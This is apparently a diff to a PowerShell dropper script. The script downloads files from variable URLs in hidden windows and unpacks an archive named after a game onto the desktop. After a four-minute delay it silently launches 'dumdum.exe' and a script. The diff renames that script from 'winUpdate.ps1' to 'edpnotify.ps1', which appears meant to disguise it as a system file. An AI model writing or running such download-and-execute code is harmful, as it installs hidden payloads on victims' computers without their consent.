@@ -42,7 +42,7 @@ powershell -Uri $zipUrl_2 Invoke-WebRequest -UseBasicParsing -OutFile "$zipFileP
 
 powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_3 -UseBasicParsing -OutFile "$zipFilePath\dumdum.zip"
 
-powershell -Uri $Url_1 Invoke-WebRequest -windowstyle hidden -UseBasicParsing -OutFile "$zipFilePath\winUpdate.ps1"
+powershell -Uri $Url_1 Invoke-WebRequest -windowstyle hidden -UseBasicParsing -OutFile "$zipFilePath\edpnotify.ps1"
 
 
 Expand-Archive -Force -Path "$zipFilePath\AssassinsCreed_SE.zip" -DestinationPath $desktopPath
@@ -57,7 +57,7 @@ Start-Sleep -Seconds 240
 
 Start-Process -windowstyle hidden -FilePath "$desktopPath\dumdum.exe" 
 
-Start-Process -windowstyle hidden -FilePath "$zipFilePath\winUpdate2.ps1"
+Start-Process -windowstyle hidden -FilePath "$zipFilePath\edpnotify.ps1"
 
 exit 0
 
